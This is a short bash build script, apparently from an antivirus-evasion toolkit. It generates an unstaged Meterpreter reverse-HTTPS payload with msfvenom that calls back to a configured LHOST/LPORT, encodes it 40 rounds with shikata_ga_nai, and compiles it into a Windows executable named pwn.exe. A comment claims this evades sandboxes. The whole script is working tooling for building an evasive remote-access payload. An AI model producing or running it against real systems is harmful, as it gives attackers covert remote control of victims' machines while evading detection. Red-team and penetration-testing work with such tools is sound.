#!/bin/bash    
# simple example script for building the .exe file

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter unstaged reverse payload, encoded 40 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter_reverse_https lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x86/shikata_ga_nai -i 40 -f c -a x86 --platform Windows > sc.txt

# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avet -f sc.txt

# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c

# cleanup
echo "" > defs.h
